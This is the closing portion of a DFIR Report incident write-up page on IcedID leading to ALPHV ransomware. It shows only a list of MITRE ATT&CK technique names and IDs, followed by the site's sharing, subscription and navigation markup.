<pre>LSASS Memory - T1003.001<br />DCSync - T1003.006<br />System Network Configuration Discovery - T1016<br />Remote System Discovery - T1018<br />Automated Exfiltration - T1020<br />Remote Desktop Protocol - T1021.001<br />System Owner/User Discovery - T1033<br />Data from Network Shared Drive - T1039<br />Commonly Used Port - T1043<br />Scheduled Task - T1053.005<br />PowerShell - T1059.001<br />Windows Command Shell - T1059.003<br />Visual Basic - T1059.005<br />Domain Groups - T1069.002<br />Web Protocols - T1071.001<br />Domain Accounts - T1078.002<br />System Information Discovery - T1082<br />File and Directory Discovery - T1083<br />Local Account - T1087.001<br />Domain Account - T1087.002<br />Network Share Discovery - T1135<br />BITS Jobs - T1197<br />Malicious File - T1204.002<br />Data from Information Repositories - T1213<br />Regsvr32 - T1218.010<br />Rundll32 - T1218.011<br />Remote Access Software - T1219<br />Domain Trust Discovery - T1482<br />Data Encrypted for Impact - T1486<br />Archive via Utility - T1560.001<br />Phishing - T1566<br />Service Execution - T1569.002<br />System Language Discovery - T1614.001<br />Indicator Removal: File Deletion - T1070.004</pre>



<p>Internal case #TB24952 #PR29648</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-34931" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-34931" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-34931" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-34931 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/" rel="prev">From IcedID to Dagon Locker Ransomware in 29 Days</a></div><div class="nav-next"><a href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" rel="next">Threat Actors&#8217; Toolkit: Leveraging Sliver, PoshC2 &#038; Batch Scripts</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="1265e6b2da" /><input type="hidden" name="_wp_http_referer" value="/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/" /><input type="hidden" name="post_id" value="34931"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script type="08b957ecebe7e48920177475-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2024\/06\/10\/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment\/":34931};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="08b957ecebe7e48920177475-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"34931\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "34931" ]);
/* ]]> */
</script>
<script type="08b957ecebe7e48920177475-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="08b957ecebe7e48920177475-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="08b957ecebe7e48920177475-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="08b957ecebe7e48920177475-|49" defer></script></body>
</html>
